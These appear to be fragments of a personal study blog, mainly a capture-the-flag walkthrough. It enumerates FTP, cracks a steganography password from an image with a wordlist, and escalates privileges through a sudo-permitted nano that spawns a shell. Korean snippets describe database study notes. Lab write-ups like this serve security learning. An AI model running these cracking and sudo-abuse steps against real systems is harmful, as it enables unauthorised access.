2.title: Enumeration
2.content: . | FTP . | File : note_to_jake.txt From Amy, Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine . | Things . | username : jake, amy, holt | Jake password’s should week | . | . | . | Web . | File Download : brooklyn99.jpg $ wget http://{EXPORT_IP}/brooklyn99.jpg . | . | .

3.content: . | stegcracker $ stegcracker brooklyn99.jpg PASSWORD_WORD_LIST . | Result Holts Password: fluffydog12@ninenine Enjoy!! . | . | .

4.title: Gainig Access

5.title: PRIVILEGE ESCALATE
5.content: . | sudo -l Matching Defaults entries for holt on brookly_nine_nine: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User holt may run the following commands on brookly_nine_nine: (ALL) NOPASSWD: /bin/nano . | Command nano -s /bin/sh /bin/sh ^T . | .

7.title: Note
7.content: 데이터베이스에 관련된 책을 읽고 내용을 정리한 것들 .

9.title: Intro
9.content: . | 공부한 것 정리해서 올리는 용도로 생성 | 공부한 내용이나 참고할만한 기본 지식 작성하는 곳 | .
